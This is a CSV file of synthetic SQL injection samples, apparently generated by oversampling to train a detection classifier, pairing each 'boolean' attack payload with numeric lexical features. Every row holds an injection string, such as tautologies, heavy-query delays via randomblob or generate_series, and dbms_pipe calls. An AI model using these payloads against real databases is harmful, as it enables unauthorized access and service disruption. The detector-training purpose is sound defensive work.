id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000269,attack,boolean,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",nearest_attack_euclidean,R000273,0.14310976251447605,107.05689145590586,31.886217088188292,3.6108284013885905,31.056891455905852,15.0,46.0,15.0,0.29009378250682283,0.14011306924207442,0.42968007900902827,0.14011306924207442,3.0,0.0,0.0,1.0,0.0,1.0,0.0,9.0,0.0,-1.1102230246251565e-16,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.056891455905853205,0.9431085440941467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998
SMOTE_000270,attack,boolean,"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""cgps"" like ""cgps",nearest_attack_euclidean,R000639,1.1457577976918,137.57974287231502,30.254057146427062,4.090212167968533,80.88920001249471,5.817571433033825,35.87297142678647,15.0,0.5870418303836383,0.041320577306647885,0.2621923413983304,0.10944525091138334,0.0,3.563514286606765,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.436485713393235,0.0,-1.1102230246251565e-16,2.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.5635142866067653,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.563514286606765
SMOTE_000271,attack,boolean,"1%'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000690,0.36646523287507865,128.53086812312958,31.47693348664522,4.11489399210177,66.66926720325827,8.23846674332261,36.90773394658088,16.71540022996783,0.5192579914956351,0.06413957428304573,0.2866556860515731,0.12994674816974608,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.23846674332261,1.0,-1.1102230246251565e-16,2.2384667433226104,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000272,attack,boolean,1   )    )     )   and 8990  =  4775 and    (    (     (  1894  =  1894,nearest_attack_euclidean,R000473,0.4166096040507195,71.89271686167066,14.178543372334133,2.5857606116440115,6.0,17.71417348933653,40.0,8.178543372334133,0.08351439933839439,0.24602115105531736,0.5567626622559625,0.11370178735032582,0.0,0.0,0.0,-1.3877787807814457e-17,0.17854337233413298,2.0,0.0,6.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,2.1785433723341328,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000273,attack,boolean,1%'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',nearest_attack_euclidean,R000147,1.9982161769339575,147.408438998759,33.4577456427685,3.9986179429170354,56.0,15.0,52.492947713222,23.915491285537,0.38074250359503525,0.10198459917724159,0.354990116432058,0.16228278079566508,6.169017428925999,1.8309825710740002,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,6.9154912855370005,1.9999999999999998,-1.1102230246251565e-16,2.220446049250313e-16,6.0,1.0,0.45774564276850005,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000274,attack,boolean,-4557%'   )    )    or 4537  =  3401 and    (    (   '%'  =  ',nearest_attack_euclidean,R000481,0.8543716861818759,70.61361126725916,19.53814486915342,2.9122381391260728,5.922886921492051,13.230515895322737,36.92206358129094,14.53814486915342,0.0831811707520092,0.1886968907352867,0.5214215737433237,0.20670036476938047,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,5.230515895322736,1.9999999999999998,-1.1102230246251565e-16,0.3076289738306841,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000275,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000603,0.2043201533126342,134.0,33.13159187583784,3.7048703393715354,43.19738781375676,15.0,55.86840812416216,19.93420406208108,0.32236856577430417,0.11194029850746269,0.416928418837031,0.14876271688120207,2.0,4.0,0.0,1.0,0.0,1.9342040620810796,0.0,10.0,0.0,-1.1102230246251565e-16,1.0,2.9342040620810796,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.9342040620810796,0.06579593791892041,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000276,attack,boolean,"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'aumk' like 'aumk",nearest_attack_euclidean,R000503,0.11746778395379553,147.03191426877567,32.07744685849794,3.558406839536793,45.84510628300411,15.0,65.30297827351848,20.883829712253082,0.31199778474626055,0.10214904888861596,0.44378897180518245,0.14206419455994104,6.0,0.0,0.0,1.0,0.0,1.0387234292489729,0.0,11.845106283004107,0.0,-1.1102230246251565e-16,1.0,2.0387234292489733,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000277,attack,boolean,"1'||  (  select 'nzjz' where 3539  =  3539 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000352,1.3615180013130375,146.74166253949556,39.303334984201776,4.062401736740714,46.65166749210089,23.0,54.39333003159645,22.696665015798224,0.318052121701073,0.15677893156742997,0.3705620570109527,0.15460688972054437,5.348332507899112,0.0,1.3033349842017756,1.0,0.0,2.0,0.0,9.348332507899112,0.0,-1.1102230246251565e-16,1.0,7.0,1.0,0.0,0.6516674921008879,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,1.0,0.0,0.651667492100888,0.3483325078991121,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000278,attack,boolean,"1"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000425,0.0575264567661162,130.22109794832937,31.936829157620174,4.259406396338242,72.0,8.968414578810087,33.2526833695193,16.0,0.5529523272161867,0.06888849038238894,0.25528088746449407,0.12287829493693037,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.063170842379825,0.0,-1.1102230246251565e-16,2.9684145788100875,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000279,attack,boolean,"1'  )   and elt  (  1407  =  6365,6365  )   and   (  'zckl'  =  'zckl",nearest_attack_euclidean,R000435,0.37803753882822144,70.77116843731557,22.70846737492623,3.5646740923611353,18.41693474985246,13.0,28.0,11.354233687463115,0.25962762128974826,0.1838963592469443,0.3960844660703416,0.16039155339296585,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,4.0,0.0,0.35423368746311384,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000280,attack,boolean,-2361'   )    )    as mzhv where 2905  =  2905 or 9026  =  5388--,nearest_attack_euclidean,R000439,0.020778215015067762,64.990418010307,22.990418010307,3.667351910497535,13.0,20.0,24.0,7.990418010306998,0.20002994371779065,0.30773837495044715,0.36928604994053654,0.1229456313912257,0.990418010306998,0.0,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,2.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,5.0,0.990418010306998,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000281,attack,boolean,"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw",nearest_attack_euclidean,R000038,0.8443010223304068,152.32987066307683,30.430055430109935,4.0258031151045275,75.72022172043974,10.0,44.65974132615364,21.949907616483443,0.4977795107748515,0.06566775477279034,0.2926383759074513,0.1439143585449068,0.0,4.0,0.0,-1.3877787807814457e-17,1.0,1.1899815232966886,0.0,6.379963046593377,0.3799630465933776,5.0,4.0,2.1899815232966886,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000282,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000162,0.27601133776216813,70.98304723615621,24.283292462308026,3.5662600302241927,14.0,21.0,27.69975477384817,8.283292462308028,0.19760437427418254,0.2964065614112738,0.3893447466162209,0.11664431769832273,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,3.2832924623080286,0.0,-1.1102230246251565e-16,2.220446049250313e-16,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000283,attack,boolean,"1  )   as ihan where 5298  =  5298 and elt  (  6587  =  3479,3479  )  --",nearest_attack_euclidean,R000375,0.13428834975059936,72.0,26.617275487386756,3.824055263327328,17.0,21.0,26.0,8.0,0.2361111111111111,0.2916666666666667,0.3611111111111111,0.1111111111111111,0.0,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.0,0.0,-1.1102230246251565e-16,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000284,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000443,0.470683844026951,149.575035044264,33.8766713392352,4.175195503887934,72.6300140177056,16.0,44.506685356940814,16.4383356696176,0.48578558694491547,0.10723198368114437,0.29697616930281096,0.11000626007112918,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.438335669617602,0.0,-1.1102230246251565e-16,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000285,attack,boolean,"-8038'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xfyq'  =  'xfyq",nearest_attack_euclidean,R000505,0.5541586429840081,81.72104383003153,23.33596148945671,3.2752776010594378,15.286840638338589,15.04912085111812,38.09824170223624,13.28684063833859,0.18726600438040594,0.18377012515657554,0.4664170713390997,0.1625467991239188,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,5.52456042555906,0.0,-1.1102230246251565e-16,0.7622802127795301,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000286,attack,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000716,0.5953645525654698,106.27754557157579,29.159693196446973,3.715248481698063,38.53800577690532,13.0,40.739539794670456,14.0,0.36005680573314175,0.12301723451961635,0.3844458610338089,0.13248009871343297,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,7.0,0.0,1.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000287,attack,boolean,"1""  )   as dfmm where 7563  =  7563 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000550,1.0724321284933052,124.53238530611931,34.06477061223861,3.9074321860227648,42.0,21.0,47.0,14.532385306119306,0.33726708497696706,0.16863354248848353,0.377417928426606,0.11668144410794346,0.0,0.5323853061193048,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,7.0,0.0,1.0,1.0,5.0,0.0,0.5323853061193048,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000288,attack,boolean,"1  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000696,0.17206533808930305,135.48783815232326,31.0,4.160444870598923,72.0,9.0,38.27528984484852,16.212548307474755,0.5316436780476724,0.06645545975595905,0.28225038782543355,0.11965047437093493,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.212548307474754,0.0,-1.1102230246251565e-16,3.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000289,attack,boolean,"1 where 3410  =  3410 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000138,0.38880818917606563,144.1976065750991,33.366267762516514,4.301286341167726,73.78193716880781,16.683133881258257,38.366267762516514,15.366267762516516,0.5115614368678469,0.11574644786613363,0.26622123273169607,0.10647088253432327,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.0,0.0,-1.1102230246251565e-16,2.6831338812582586,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000290,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000174,0.34601323576236304,121.40486629327522,27.0,3.4986724733585755,41.20243314663761,13.0,53.20243314663761,14.0,0.3390999842503508,0.10726667716643282,0.43811537855782723,0.11551796002538917,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,7.800608286659402,0.1993917133405978,-1.1102230246251565e-16,2.220446049250313e-16,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000291,attack,boolean,1'   )    )     )   and   (  8982  =  8027  )  *8027 and    (    (     (  'qkrv'  =  'qkrv,nearest_attack_euclidean,R000294,0.5080851354660304,85.80554393751194,18.419445606248807,2.9028244559407472,14.0,13.0,44.644435150009556,14.161108787502389,0.16371144234372678,0.15201776789060342,0.5193518131250399,0.16491897664063,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,7.161108787502389,0.0,-1.1102230246251565e-16,2.220446049250313e-16,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000292,attack,boolean,"1'||  (  select 'nzjz' where 3539  =  3539 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000352,0.5326950017523996,145.6814268549031,39.72742925803876,4.0874036487194,46.863714629019384,23.0,53.54514148392248,22.27257074196124,0.3217568532886145,0.15790010033734386,0.3674910295107538,0.1528520168632879,5.1362853709806195,0.0,1.7274292580387611,1.0,0.0,2.0,0.0,9.13628537098062,0.0,-1.1102230246251565e-16,1.0,7.0,1.0,0.0,0.8637146290193805,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,1.0,0.0,0.8637146290193806,0.13628537098061938,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000293,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  '%'  =  '",nearest_attack_euclidean,R000076,0.4100544476390841,115.3363035375051,27.0,3.939855381406495,63.0,5.0,28.85968874643294,18.47661479107216,0.5467296576483478,0.04339124267050379,0.24966545975580406,0.16021363992534438,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,3.4766147910721568,1.0,5.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000294,attack,boolean,select * from users where id  =  1 %  (  1  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000015,0.5837198927593442,63.0,22.319324706722984,3.389455261010543,24.0,4.680675293277016,26.0,8.319324706722982,0.38095238095238093,0.07429643322661932,0.4126984126984127,0.13205277312258704,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,2.0,0.680675293277017,-1.1102230246251565e-16,2.220446049250313e-16,5.319324706722983,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000295,attack,boolean,"1  )   as kjsd where 1670  =  1670 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000679,0.23611105366115334,152.83380399029892,33.104225498787365,4.097542624551446,73.0,18.0,42.62535299272418,19.208450997574726,0.47776037453569814,0.11780392796770639,0.27878428812917444,0.12565140936742103,0.10422549878736365,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.104225498787364,0.0,5.0,4.0,5.0,0.10422549878736359,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000296,attack,boolean,"1%""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000614,1.5616314472509607,154.9216278339178,31.0,3.587794917691901,39.0,16.0,68.40604645146172,31.51558138245608,0.2548348242155251,0.10454762019098468,0.43685696355834347,0.20376059203514674,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,13.51558138245608,1.9999999999999998,2.0,1.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000297,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473",nearest_attack_euclidean,R000135,0.23741101009017976,125.5023525145029,29.0,4.234504745893497,72.0,11.246471228245637,30.00470502900582,12.251176257251455,0.5737216137924908,0.08968697155002645,0.23899337988693814,0.09759803477054468,0.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,3.2511762572514544,0.0,-1.1102230246251565e-16,3.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
